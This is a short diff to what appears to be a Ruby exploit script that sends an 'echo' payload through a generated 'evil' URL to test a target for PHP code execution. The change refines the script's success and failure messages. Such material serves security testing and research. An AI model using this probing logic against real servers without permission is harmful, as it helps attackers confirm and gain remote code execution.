@@ -225,9 +225,12 @@ url, payload = gen_evil_url("echo #{random}")
 response = http_request(url, "post", payload)
 if response.code == "200" and not response.body.empty?
   result = clean_result(response.body)
-  puts "[+] Result : #{result}"
+  if not result.empty?
+    puts "[+] Result : #{result}"
 
-  puts response.body.match(/#{random}/)? "[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!" : "[+] Target might to be exploitable?"
+    puts response.body.match(/#{random}/)? "[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!" : "[i] Target might to be exploitable (1)...   Detect output, but didn't match expected result"
+  else
+    puts "[i] Target might to be exploitable (2)...   Didn't detect any output (disabled PHP function?)"
 else
   puts "[!] Target is NOT exploitable ~ HTTP Response: #{response.code}"
   exit
